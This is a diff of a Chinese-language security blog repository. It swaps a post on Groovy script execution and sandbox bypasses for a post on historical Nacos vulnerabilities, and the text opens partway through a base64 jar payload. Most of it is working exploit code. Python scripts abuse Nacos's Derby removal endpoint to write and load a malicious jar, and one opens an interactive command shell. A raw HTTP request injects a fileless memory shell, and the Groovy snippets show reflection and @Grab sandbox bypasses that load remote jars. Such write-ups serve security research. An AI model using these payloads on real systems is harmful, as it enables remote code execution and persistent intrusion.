GV4YW1wbGUvVGVzdC5qYXZhdU+xDoJADN35io6wEJ2Ji4m7UTfjUErBi3Bc7gpiDP/uoafi4FvavLzX92qQLlgx8ICNqTmLItPltSKgGp2DAzuBewQegXeC4kffqgIaVDrei1W6Op4AbeWSIB7/WXhgChagpnjrJ7zYdVeWbCEvYQWarz9snGQftdjbzDtha1ti39l4567TohpOK5awxkn6zJ5Cv1dGIBQ6Q7wZiI2oVkOPdrmY9xrDR+MDUEsHCBUAwqSrAAAALAEAAFBLAQIUABQACAgIAL1uZFsAAAAAAgAAAAAAAAAJAAQAAAAAAAAAAAAAAAAAAABNRVRBLUlORi/+ygAAUEsBAhQAFAAICAgAvW5kWyvwyMdDAAAARAAAABQAAAAAAAAAAAAAAAAAPQAAAE1FVEEtSU5GL01BTklGRVNULk1GUEsBAgoACgAACAAAu25kWwAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAwgAAAGV4YW1wbGUvUEsBAhQAFAAICAgAu25kW85bYSl8AQAAcAIAABIAAAAAAAAAAAAAAAAA6AAAAGV4YW1wbGUvVGVzdC5jbGFzc1BLAQIUABQACAgIALhuZFsVAMKkqwAAACwBAAARAAAAAAAAAAAAAAAAAKQCAABleGFtcGxlL1Rlc3QuamF2YVBLBQYAAAAABQAFADIBAACOAwAAAAA=&quot;</span></span><br><span class="line">payload = base64.b64decode(payload).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target</span>):</span><br><span class="line"></span><br><span class="line">    removal_url = urljoin(target,<span class="string">&quot;/nacos/v1/cs/ops/data/removal&quot;</span>)</span><br><span class="line">    now_id = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> * <span class="number">2</span> ,<span class="number">8</span>))</span><br><span class="line">    now_table = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> * <span class="number">2</span> ,<span class="number">8</span>))</span><br><span class="line">    jar_name = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> * <span class="number">2</span> ,<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        post_sql = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(&#x27;values CAST (X&#x27;&#x27;<span class="subst">&#123;payload&#125;</span>&#x27;&#x27; AS BLOB)&#x27;,&#x27;/tmp/<span class="subst">&#123;jar_name&#125;</span>.dat&#x27;,&#x27;,&#x27; ,&#x27;&quot;&#x27;,&#x27;UTF-8&#x27;,&#x27;/tmp/<span class="subst">&#123;jar_name&#125;</span>.jar&#x27;)</span></span><br><span class="line"><span class="string">        CALL sqlj.install_jar(&#x27;/tmp/<span class="subst">&#123;jar_name&#125;</span>.jar&#x27;,&#x27;NACOS.<span class="subst">&#123;now_id&#125;</span>&#x27;,0)</span></span><br><span class="line"><span class="string">        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;NACOS.<span class="subst">&#123;now_id&#125;</span>&#x27;)</span></span><br><span class="line"><span class="string">        CREATE PROCEDURE <span class="subst">&#123;now_table&#125;</span>(PARAM VARCHAR(200)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;example.Test.exec&#x27;</span></span><br><span class="line"><span class="string">        CALL <span class="subst">&#123;now_table&#125;</span>(&#x27;touch /tmp/666&#x27;)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(payload=payload, jar_name=jar_name)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>:post_sql&#125;</span><br><span class="line">        resp = requests.post(url=removal_url, files=files)</span><br><span class="line">        <span class="built_in">print</span>(resp.text)</span><br><span class="line">        <span class="keyword">if</span> resp.json()[<span class="string">&quot;code&quot;</span>] == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target = <span class="string">&quot;http://127.0.0.1:8848&quot;</span></span><br><span class="line">    exploit(target = target)</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">GroovyClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyClassLoader</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> classLoader.parseClass(<span class="string">&quot;class Test &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    static void main(String[] args) &#123;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        GroovyShell groovyShell = new GroovyShell();\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        String cmd = \&quot;\\\&quot;whoami\\\&quot;.execute().text\&quot;;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;        println(groovyShell.evaluate(cmd).toString());\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line"><span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="type">GroovyObject</span> <span class="variable">object</span> <span class="operator">=</span> (GroovyObject) clazz.newInstance();</span><br><span class="line">object.invokeMethod(<span class="string">&quot;main&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>发现成功命令执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762235896967-7af9b375-f8ff-4dcc-8a54-e823ceabd4dd.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762235896967-7af9b375-f8ff-4dcc-8a54-e823ceabd4dd.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="wvH8G">基于FUNCTION的不出网利用</h6>
+同时也是利用`SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE`函数将jar包写入服务器本地，然后加载本地jar包，最后使用derby接口使用子查询来调用UDF函数
 
-<h3 id="RBnlK">ScriptEngine</h3>
-使用 javax.script.ScriptEngine 执行 Groovy 脚本
+<p>payload的如下，原理和上面的任意代码执行类似</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload = base64.b64decode(payload).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">target</span>):</span><br><span class="line">    removal_url = urljoin(target,<span class="string">&#x27;/nacos/v1/cs/ops/data/removal&#x27;</span>)</span><br><span class="line">    derby_url = urljoin(target, <span class="string">&#x27;/nacos/v1/cs/ops/derby&#x27;</span>)</span><br><span class="line">    now_id = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>,<span class="number">8</span>))</span><br><span class="line">    jar_name = <span class="string">&#x27;&#x27;</span>.join(random.sample(<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>,<span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        post_sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE(&#x27;values CAST (X&#x27;&#x27;&#123;payload&#125;&#x27;&#x27; AS BLOB)&#x27;, &#x27;/tmp/&#123;junk&#125;.dat&#x27;, &#x27;,&#x27; ,&#x27;&quot;&#x27;, &#x27;UTF-8&#x27;, &#x27;/tmp/&#123;jar_name&#125;.jar&#x27;)</span></span><br><span class="line"><span class="string">        CALL sqlj.install_jar(&#x27;/tmp/&#123;jar_name&#125;.jar&#x27;, &#x27;NACOS.&#123;id&#125;&#x27;, 0)</span></span><br><span class="line"><span class="string">        CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;NACOS.&#123;id&#125;&#x27;)</span></span><br><span class="line"><span class="string">        CREATE FUNCTION S_EXAMPLE_&#123;id&#125;( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME &#x27;example.Test.exec&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>.<span class="built_in">format</span>(junk=os.urandom(<span class="number">3</span>).<span class="built_in">hex</span>(),payload=payload,<span class="built_in">id</span>=now_id,jar_name=jar_name)</span><br><span class="line">        files = &#123;<span class="string">&#x27;file&#x27;</span>: post_sql&#125;</span><br><span class="line">        post_resp = requests.post(url=removal_url,files=files)</span><br><span class="line">        post_json = post_resp.json()</span><br><span class="line">        <span class="keyword">if</span> post_json.get(<span class="string">&#x27;message&#x27;</span>,<span class="literal">None</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> post_json.get(<span class="string">&#x27;data&#x27;</span>,<span class="literal">None</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                command = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">                get_sql = <span class="string">&quot;select * from (select count(*) as b, S_EXAMPLE_&#123;id&#125;(&#x27;&#123;cmd&#125;&#x27;) as a from config_info) tmp /*ROWS FETCH NEXT*/&quot;</span>.<span class="built_in">format</span>(<span class="built_in">id</span>=now_id,cmd=command)</span><br><span class="line">                get_resp = requests.get(url=derby_url,params=&#123;<span class="string">&#x27;sql&#x27;</span>:get_sql&#125;)</span><br><span class="line">                <span class="built_in">print</span>(get_resp.json())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target = <span class="string">&#x27;http://127.0.0.1:8848&#x27;</span></span><br><span class="line">    exploit(target=target)</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngine</span> <span class="variable">scriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>().getEngineByName(<span class="string">&quot;groovy&quot;</span>);</span><br><span class="line">System.out.println(scriptEngine.eval(<span class="string">&quot;\&quot;whoami\&quot;.execute().text&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>这种方法的好处是，自定义函数返回值可以为String，命令执行结果可以返回给客户端</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762238281839-b7f412e8-c6b4-4582-bcec-0eceac9057de.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1762238281839-b7f412e8-c6b4-4582-bcec-0eceac9057de.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<h6 id="T8ail">不出网-无文件落地</h6>
+上面两种方式均存在文件落地的情况，很容易被监测到
 
-<h3 id="gLuK7">其他利用方式</h3>
-<h4 id="zugFf">文件读取</h4>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=newFile(<span class="string">&quot;C:\\Windows\\system.ini&quot;</span>).eachLine&#123;printlnit;&#125;</span><br></pre></td></tr></table></figure>
+<p>以下是不出网-无文件落地 注入内存马 的payload，很常见的使用ClassLoader去加载字节码的方式，可以直接使用nacos工具一把梭</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST /nacos/v1/cs/ops/data/removal HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8847</span></span><br><span class="line">User-Agent: Requests <span class="number">5.0</span><span class="number">.3</span>, Java <span class="number">11.0</span><span class="number">.2</span></span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=<span class="number">.2</span>, */*; q=<span class="number">.2</span></span><br><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc2MjI2Njg1OX0.ZIfF_VoQwPlV-BIIlr0vwSYclga87MpJzcOej-Huo2o</span><br><span class="line">Content-<span class="type">Type</span>: multipart/form-data; boundary=********************<span class="number">1762228187959</span></span><br><span class="line">Content-Length: <span class="number">16583</span></span><br><span class="line"></span><br><span class="line">--********************<span class="number">1762228187959</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;uojqmjwiq&quot;</span></span><br><span class="line">Content-<span class="type">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">create <span class="built_in">type</span> uojqmjwiqClass external name <span class="string">&#x27;java.lang.Class&#x27;</span> language java</span><br><span class="line">create <span class="built_in">type</span> uojqmjwiqObject external name <span class="string">&#x27;java.lang.Object&#x27;</span> language java</span><br><span class="line">create <span class="built_in">type</span> uojqmjwiqClassLoader external name <span class="string">&#x27;java.lang.ClassLoader&#x27;</span> language java</span><br><span class="line">create function uojqmjwiq64Decode(className VARCHAR(<span class="number">32672</span>)) returns VARCHAR(<span class="number">32672</span>) FOR BIT DATA external name <span class="string">&#x27;org.springframework.util.Base64Utils.decodeFromString&#x27;</span> language java parameter style java</span><br><span class="line">create function getuojqmjwiqmClassLoader() returns uojqmjwiqClassLoader external name <span class="string">&#x27;java.lang.ClassLoader.getSystemClassLoader&#x27;</span> language java parameter style java</span><br><span class="line">create function deuojqmjwiqClass(className VARCHAR(<span class="number">32672</span>),<span class="built_in">bytes</span> VARCHAR(<span class="number">32672</span>) FOR BIT DATA,loader uojqmjwiqClassLoader) returns uojqmjwiqClass external name <span class="string">&#x27;org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)&#x27;</span> language java parameter style java</span><br><span class="line">create table injeuojqmjwiqct(v uojqmjwiqClass)</span><br><span class="line">insert into injeuojqmjwiqct values (deuojqmjwiqClass(<span class="string">&#x27;com.fasterxml.jackson.p.JSONUtil&#x27;</span>, uojqmjwiq64Decode(<span class="string">&#x27;&#123;payload&#125;&#x27;</span>), getuojqmjwiqmClassLoader()))</span><br><span class="line"></span><br><span class="line">--********************<span class="number">1762228187959</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h4 id="AvpCE">文件写入</h4>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newFile(<span class="string">&quot;C:\\Users\\RedTeam\\Desktop\\SecTest\\shell.jsp&quot;</span>).write(<span class="string">&#x27;HelloAl1ex&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<h3 id="c7COA">其他漏洞</h3>
+除了上面的漏洞以外，还有两个不太常见的漏洞：
 
-<h2 id="OF9jY">绕过沙箱</h2>
-有些情况下，会使用groovy沙箱机制保护敏感脚本的执行，在一些情况下可以绕过
+<ul>
+<li>nacos snakeyaml反序列化</li>
+<li>hessian反序列化</li>
+</ul>
+<p>由于这两个漏洞不是很常见，反序列化部分之前有分析过，我就直接贴出漏洞文章了</p>
+<h4 id="YqjCL">NacosSnakeYaml反序列化</h4>
+文章链接：[https://xz.aliyun.com/news/9803](https://xz.aliyun.com/news/9803)
 
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.kohsuke<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>groovy-sandbox<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="PI7bg">NacosHessian反序列化</h4>
+文章链接：[https://xz.aliyun.com/news/13761](https://xz.aliyun.com/news/13761)
 
-<h3 id="ZoTyg">Java反射Bypass</h3>
-有些情况在沙箱中，通过匹配调用方法来进行拦截，那么通过反射调用，即可绕过拦截
 
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//常规反射调用</span></span><br><span class="line"><span class="string">&quot;xxx.forName(&quot;</span>java.lang.Runtime<span class="string">&quot;).getRuntime().exec(&quot;</span>id<span class="string">&quot;).getText()</span></span><br><span class="line"><span class="string">//拼接反射调用</span></span><br><span class="line"><span class="string">import java.lang.reflect.Method;</span></span><br><span class="line"><span class="string">Class&lt;?&gt;rt=Class.forName(&quot;</span>java.lan<span class="string">&quot;+&quot;</span>g.Run<span class="string">&quot;+&quot;</span>time<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Methodgr=rt.getMethod(&quot;</span>getRun<span class="string">&quot;+&quot;</span>time<span class="string">&quot;);</span></span><br><span class="line"><span class="string">Methodex=rt.getMethod(&quot;</span>exe<span class="string">&quot;+&quot;</span>c<span class="string">&quot;,String.class);</span></span><br><span class="line"><span class="string">ex.invoke(gr.invoke(null),&quot;</span>cal<span class="string">&quot;+&quot;</span>c<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="rznvT">@AST注解执行恶意类</h3>
-利用AST注解能够执行断言从而实现代码执行，同时可以利用该方式Bypass沙箱
 
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;@groovy.transform.ASTTest(value=&#123;assertRuntime.getRuntime().exec(&quot;calc&quot;)&#125;)defx&#x27;&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<h3 id="PIjkd">@Grab注解加载远程恶意类</h3>
-Groovy的Grape机制允许开发者在不修改ClassPath的情况下，动态地引入Jar依赖，那么我们也可以使用这个特性，动态引入恶意代码，从而导致RCE
-
-<p>如果使用这种方式绕过沙箱，那么要求对方服务器存在<code>ivy</code>依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.ivy<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ivy<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后我们需要编写一个恶意的EXP类，执行我们的恶意代码，并打包为jar包</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">编译</span></span><br><span class="line">javac Exp.java</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建服务提供者配置文件</span></span><br><span class="line">mkdir -p META-INF/services/</span><br><span class="line">echo Exp &gt; META-INF/services/org.codehaus.groovy.plugins.Runners</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打包jar包</span></span><br><span class="line">jar cvf poc-0.jar Exp.class META-INF</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exp</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>然后使用将jar包上传到服务器，使用Python开启一个http服务</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure>
-
-<p>通过上面任意一种方式，执行以下groovy脚本</p>
-<p>在执行该groovy脚本时，会从远程地址加载恶意jar包并加载，实例化我们的恶意类，从而执行系统命令RCE</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="keyword">class</span>.classLoader.parseClass(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    @GrabConfig(disableChecksums=true)</span></span><br><span class="line"><span class="string">    @GrabResolver(name=&#x27;Exp&#x27;, root=&#x27;http://127.0.0.1:8000/&#x27;)</span></span><br><span class="line"><span class="string">    @Grab(group=&#x27;test&#x27;, module=&#x27;poc&#x27;, version=&#x27;0&#x27;)</span></span><br><span class="line"><span class="string">    import Exp;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
 
 
       </div>
       <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C/" class="">
-              脚本执行
-            </a>
-          
-        </div>
         
       </div>
       
@@ -677,7 +678,7 @@ Groovy的Grape机制允许开发者在不修改ClassPath的情况下，动态地
     </li>
     <li class="post-copyright-link">
     <strong>文章链接:  </strong>
-    <a href="/2025/08/04/Groovy脚本执行/" target="_blank" title="Groovy脚本执行">http://curlysean.github.io/2025/08/04/Groovy脚本执行/</a>
+    <a href="/2025/11/09/Nacos历史漏洞/" target="_blank" title="">http://curlysean.github.io/2025/11/09/Nacos历史漏洞/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明:   </strong>
@@ -695,44 +696,23 @@ Groovy的Grape机制允许开发者在不修改ClassPath的情况下，动态地
 
 
 
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-63bbdb5b76b8d349ad35ff4281efbd37_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">Agent内存马</div>
-      </div>
-      
-      <!-- <div class="content">
-        JavaAgent内存马
-前言
-基于Tomcat的内存马类型有四种：Filter、Servlet、Listener和Ag
-      </div> -->
-    </a>
-  </div>
-
 
 
   
   <div class="post-nav-next post-nav-item">
     <div class="post-nav-img" style="background-size: cover; 
       background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://pic2.zhimg.com/80/v2-e22aaad20d20634f506f57fff0fcbc17_1440w.webp" class="lazyload placeholder" data-srcset="https://pic2.zhimg.com/80/v2-e22aaad20d20634f506f57fff0fcbc17_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
+      <img class="lazyload lazyload placeholder" src="https://picx.zhimg.com/80/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" class="lazyload placeholder" data-srcset="https://picx.zhimg.com/80/v2-b44931ea513e5f7b3b06f2703f79653c_1440w.webp" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
     </div>
-    <a href="/2025/07/31/Java%E4%B8%AD%E7%9A%84%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="post-nav-link">
+    <a href="/2025/09/30/SpringAop%E9%93%BE/" class="post-nav-link">
       <div class="title">
         下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">Java中的模板注入</div>
+        <div class="title-text">SpringAop链</div>
       </div>
       <!-- <div class="content">
-        Java中的模板注入
+        SpringAop链
 前言
-
-最近在审计系统的时候，复现一个SSTI模板注入的漏洞，感觉SSTI的危害程度挺高的，因为感
+前面学习Hessian反序列化时，发现只有Rome反序列化这一条链是我学习过的，现在来补一补
       </div> -->
     </a>
   </div>
@@ -951,7 +931,7 @@ Groovy的Grape机制允许开发者在不修改ClassPath的情况下，动态地
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#eZT12"><span class="toc-text">Groovy脚本执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IQBDG"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#oHaDg"><span class="toc-text">Groovy命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HKPPP"><span class="toc-text">直接执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kdz8F"><span class="toc-text">MethodClosure执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ALPXO"><span class="toc-text">Java中执行Groovy脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Uh7Pf"><span class="toc-text">GroovyShell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#yK6vM"><span class="toc-text">字符串执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#yg1h1"><span class="toc-text">文件执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uR4rV"><span class="toc-text">远程URL执行</span></a></li></ol></li><li class="toc-item 